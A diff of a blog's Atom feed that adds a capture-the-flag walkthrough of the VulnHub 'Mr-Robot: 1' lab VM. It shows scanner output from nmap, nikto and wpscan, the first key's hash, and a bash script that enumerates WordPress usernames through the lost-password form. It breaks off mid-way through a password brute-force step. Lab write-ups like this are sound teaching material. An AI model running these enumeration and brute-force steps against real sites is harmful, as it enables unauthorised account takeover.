@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulnhub | F4l13n5n0w]]></title>
   <link href="http://f4l13n5n0w.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://f4l13n5n0w.github.io/"/>
-  <updated>2016-06-08T08:36:18-04:00</updated>
+  <updated>2016-08-10T09:12:30-04:00</updated>
   <id>http://f4l13n5n0w.github.io/</id>
   <author>
     <name><![CDATA[F4l13n5n0w]]></name>
@@ -12,6 +12,847 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[[VulnHub] Mr-Robot: 1]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/"/>
+    <updated>2016-08-10T06:46:39-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1</id>
+    <content type="html"><![CDATA[<hr />
+
+<p>&ldquo;Based on the show, Mr. Robot. This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. The VM isn&rsquo;t too difficult. There isn&rsquo;t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/jason,292/">Jason</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>
+
+<p>Target: Mr-Robot: 1 (<em>10.1.1.137/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li><code>robot.txt</code> sensitive information disclosure</li>
+<li><code>WordPress</code> username and password bruteforce attack</li>
+<li>Exploit Old NMAP <code>--interactive</code> privilege escalation vulnerability to get ROOT</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
+<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
+<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
+<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
+<li>Exploit WordPress administrator/editor account to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
+<li>Enumeration and exploit the local priviledge vulnerability (<code>old NMAP --interactive</code> vulnerability) to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
+<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="https://wpscan.org/">wpscan</a></li>
+<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="https://portswigger.net/burp/">burp suite</a></li>
+<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
+</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
+</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
+</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
+</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
+</span><span class='line'>10.1.1.137  00:0c:29:61:51:fa   VMware, Inc.
+</span><span class='line'>10.1.1.254  00:50:56:f3:e7:2a   VMware, Inc.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 3.021 seconds <span class="o">(</span>84.74 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><code>10.1.1.137</code> is our Target!</p>
+
+<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.137/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-08-05 12:37:00 GMT
+</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
+</span><span class='line'>Initiating SYN Stealth Scan
+</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
+</span><span class='line'>Discovered open port 80/tcp on 10.1.1.137                                    &lt;br/&gt;
+</span><span class='line'>Discovered open port 443/tcp on 10.1.1.137                    &lt;br/&gt;
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
+</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.137
+</span><span class='line'>Host is up <span class="o">(</span>0.0037s latency<span class="o">)</span>.
+</span><span class='line'>PORT    STATE SERVICE  VERSION
+</span><span class='line'>80/tcp  open  http     Apache httpd
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+</span><span class='line'><span class="p">|</span> http-methods:
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span><span class='line'>443/tcp open  ssl/http Apache httpd
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+</span><span class='line'><span class="p">|</span> http-methods:
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span><span class='line'><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.example.com
+</span><span class='line'><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>www.example.com
+</span><span class='line'><span class="p">|</span> Public Key <span class="nb">type</span>: rsa
+</span><span class='line'><span class="p">|</span> Public Key bits: 1024
+</span><span class='line'><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
+</span><span class='line'><span class="p">|</span> Not valid before: 2015-09-16T10:45:03
+</span><span class='line'><span class="p">|</span> Not valid after:  2025-09-13T10:45:03
+</span><span class='line'><span class="p">|</span> MD5:   3c16 3b19 87c3 42ad <span class="m">6634</span> c1c9 d0aa fb97
+</span><span class='line'><span class="p">|</span>_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
+</span><span class='line'>MAC Address: 00:0C:29:61:51:FA <span class="o">(</span>VMware<span class="o">)</span>
+</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span><span class='line'>Device <span class="nb">type</span>: general purpose
+</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span><span class='line'>OS details: Linux 3.10 - 3.19, Linux 3.2 - 4.0
+</span><span class='line'>Uptime guess: 0.000 days <span class="o">(</span>since Fri Aug  <span class="m">5</span> 08:38:08 2016<span class="o">)</span>
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Only port <code>80</code> and <code>443</code> is found and <code>Apache</code> is the HTTP server.</p>
+
+<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port <code>80</code> found by port-scanning stage.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
+</span><span class='line'>+ Target Host: 10.1.1.137
+</span><span class='line'>+ Target Port: 80
+</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.5.29
+</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
+</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>tcn<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: list
+</span><span class='line'>+ GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.wisec.it/sectou.php?id=4698ebdc59d15.&quot;</span>&gt;http://www.wisec.it/sectou.php?id<span class="o">=</span>4698ebdc59d15.&lt;/a&gt; The following alternatives <span class="k">for</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>index<span class="p">&amp;</span>rsquo<span class="p">;</span> were found: index.html, index.php
+</span><span class='line'>+ OSVDB-3092: GET /admin/: This might be interesting<span class="p">&amp;</span>hellip<span class="p">;</span>
+</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>link<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/?p=23&quot;</span>&gt;http://10.1.1.137/?p<span class="o">=</span>23&lt;/a&gt;<span class="p">;</span> <span class="nv">rel</span><span class="o">=</span>shortlink
+</span><span class='line'>+ GET /readme.html: This WordPress file reveals the installed version.
+</span><span class='line'>+ GET /wp-links-opml.php: This WordPress script reveals the installed version.
+</span><span class='line'>+ OSVDB-3092: GET /license.txt: License file found may identify site software.
+</span><span class='line'>+ GET /admin/index.html: Admin login page/section found.
+</span><span class='line'>+ GET Cookie wordpress_test_cookie created without the httponly flag
+</span><span class='line'>+ GET /wp-login/: Admin login page/section found.
+</span><span class='line'>+ GET /wordpress/: A Wordpress installation was found.
+</span><span class='line'>+ GET /wp-admin/wp-login.php: Wordpress login found
+</span><span class='line'>+ GET /blog/wp-login.php: Wordpress login found
+</span><span class='line'>+ GET /wp-login.php: Wordpress login found
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><code>WordPress CMS</code> is found, also <code>/robots.txt</code> and <code>/license.txt</code> are found.</p>
+
+<p>So I run <code>wpscan</code> to scan this WordPress CMS, and in the mean time, I go have a look at the two interesting files.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# wpscan <span class="p">&amp;</span>ndash<span class="p">;</span>url 10.1.1.137&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;    __          _______   _____
+</span><span class='line'>    <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
+</span><span class='line'>     <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
+</span><span class='line'>      <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>
+</span><span class='line'>       <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
+</span><span class='line'>        <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
+</span><span class='line'>
+</span><span class='line'>    WordPress Security Scanner by the WPScan Team
+</span><span class='line'>                   Version 2.8
+</span><span class='line'>      Sponsored by Sucuri - https://sucuri.net
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;   @&lt;em&gt;WPScan&lt;/em&gt;, @ethicalhack3r, @erwan_lr, pvdl, @&lt;em&gt;FireFart&lt;/em&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;hr /&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>i<span class="o">]</span> It seems like you have not updated the database <span class="k">for</span> some time.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/&quot;</span>&gt;http://10.1.1.137/&lt;/a&gt;
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Started: Fri Aug  <span class="m">5</span> 23:16:00 2016&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> robots.txt available under: <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/robots.txt&quot;</span>&gt;http://10.1.1.137/robots.txt&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span>
+</span><span class='line'><span class="o">[</span>!<span class="o">]</span> The WordPress <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/readme.html&quot;</span>&gt;http://10.1.1.137/readme.html&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> file exists exposing a version number
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: SERVER: Apache
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> XML-RPC Interface available under: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/xmlrpc.php&quot;</span>&gt;http://10.1.1.137/xmlrpc.php&lt;/a&gt;&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> WordPress version 4.3.5 identified from rss generator&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Enumerating plugins from passive detection <span class="p">&amp;</span>hellip<span class="p">;</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> No plugins found&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Finished: Fri Aug  <span class="m">5</span> 23:16:01 2016
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Requests Done: 48
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Memory used: 7.668 MB
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Elapsed <span class="nb">time</span>: 00:00:00
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>From the <code>wpscan</code> result, there is nothing special information. But from the robot file <code>/robots.txt</code>, I got the 1st flag!</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>User-agent: *
+</span><span class='line'>fsocity.dic
+</span><span class='line'>key-1-of-3.txt
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>The first key found in the file <code>key-1-of-3.txt</code>: <font color='red'><code>073403c8a58a1f80d943455fb30724b9</code></font></p>
+
+<p>And I got a dictionary file <code>fsocity.dic</code> as well.</p>
+
+<p>Highly believed that I can brute force username / password by using this dictionary file, and I filtered it to include the strings which only between 4-8 digitals.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# grep -E <span class="p">&amp;</span>lsquo<span class="p">;</span>^<span class="o">[</span>a-zA-Z<span class="o">]</span><span class="p">&amp;</span>rsquo<span class="p">;</span> fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span>  awk <span class="p">&amp;</span>lsquo<span class="p">;</span>length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span><span class="m">8</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> &gt;<span class="o">=</span> <span class="m">4</span> <span class="o">{</span> print <span class="nv">$1</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; users.txt
+</span><span class='line'>root@kali:~/mrRobot# ls -l
+</span><span class='line'>total 7124
+</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root    <span class="m">1546</span> Aug  <span class="m">5</span> 08:48 10.1.1.137_nikto.txt
+</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root    <span class="m">1845</span> Aug  <span class="m">5</span> 08:38 10.1.1.137_nmap.txt
+</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root <span class="m">7245381</span> Aug  <span class="m">5</span> 23:49 fsociety.dic
+</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root   <span class="m">37007</span> Aug  <span class="m">7</span> 04:06 users.txt
+</span><span class='line'>root@kali:~/mrRobot# wc -l users.txt
+</span><span class='line'><span class="m">5247</span> users.txt
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>In order to brute force wordpress username, I could not find any tool on the Internet, so I write a simple script <code>enum_wp_users.sh</code> to do it.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;!/bin/bash&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;function usage<span class="o">(){</span>
+</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c">### wordpress username enumerator v0.1&amp;rdquo;</span>
+</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c">### by using wordpress&#39; lostpassword function.&amp;rdquo;</span>
+</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>USAGE: <span class="nv">$0</span> &lt;base-url&gt; &lt;wordlist&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'><span class="o">}</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;function main<span class="o">(){</span>
+</span><span class='line'>    <span class="nb">local </span><span class="nv">base_url</span><span class="o">=</span><span class="nv">$1</span>
+</span><span class='line'>    <span class="nb">local </span><span class="nv">wordlist</span><span class="o">=</span><span class="nv">$2</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;&lt;code&gt;for word in <span class="k">$(</span>cat <span class="s2">&quot;$wordlist&quot;</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span><span class='line'>    <span class="k">if</span> ! curl -s --data <span class="s2">&quot;user_login=${word}&amp;amp;redirect_to=&amp;amp;wp-submit=Get+New+Password&quot;</span> <span class="s2">&quot;http://${base_url}/wp-login.php?action=lostpassword&quot;</span> <span class="p">|</span> grep -q ERROR<span class="p">;</span> <span class="k">then</span>
+</span><span class='line'>        <span class="nb">echo</span> <span class="s2">&quot;Found valid username: ${word}&quot;</span>
+</span><span class='line'>    <span class="k">fi</span>
+</span><span class='line'><span class="k">done</span>
+</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;<span class="o">}</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;if <span class="o">[</span> -z <span class="nv">$2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span><span class='line'>    usage
+</span><span class='line'><span class="k">else</span>
+</span><span class='line'>    main <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$@</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
+</span><span class='line'><span class="k">fi</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>By using this script with filtered dictionary file <code>users.txt</code>, I found one valid username <code>elliot</code>.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# ./enum_wp_users.sh 10.1.1.137 users.txt
+</span><span class='line'>Found valid username: elliot
+</span><span class='line'>Found valid username: Elliot
+</span><span class='line'>Found valid username: ELLIOT
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then using wpscan to brute force password for the user <code>elliot</code>.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
